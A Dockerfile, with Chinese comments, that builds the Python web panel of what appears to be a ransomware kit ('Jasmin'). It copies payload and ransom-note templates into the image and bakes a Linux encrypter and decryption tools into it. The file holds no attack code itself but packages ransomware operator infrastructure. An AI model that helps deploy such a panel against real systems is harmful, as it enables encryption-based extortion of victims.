FROM python:3.11-slim

RUN apt-get update && apt-get install -y --no-install-recommends \
    default-libmysqlclient-dev gcc git && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY ["Web Panel Python/", "/app/"]

# 载荷模板以 PHP 侧为唯一数据源，构建时覆盖 Python 侧副本。
# 曾因两份副本漂移，导致 v2.3.4 的勒索信修复只生效在 PHP 侧。
COPY ["Web Panel/templates/", "/app/templates/payloads/"]

# 解密工具烘焙到非卷路径；entrypoint 运行时补进 shared_payloads 卷
COPY ["Linux Encrypter/", "/opt/jasmin-tools/"]

RUN pip install --no-cache-dir -r requirements.txt \
    && mkdir -p /app/payloads

RUN rm -f /app/config.json

COPY docker/entrypoint-python.sh /entrypoint.sh
RUN chmod +x /entrypoint.sh

ENV FLASK_APP=app.py
# 不再在这里写死 SECRET_KEY —— 镜像内固定值等于公开的会话签名密钥。
# 由 entrypoint 为每个部署生成随机值并持久化到 config.json。

EXPOSE 5000

ENTRYPOINT ["/entrypoint.sh"]
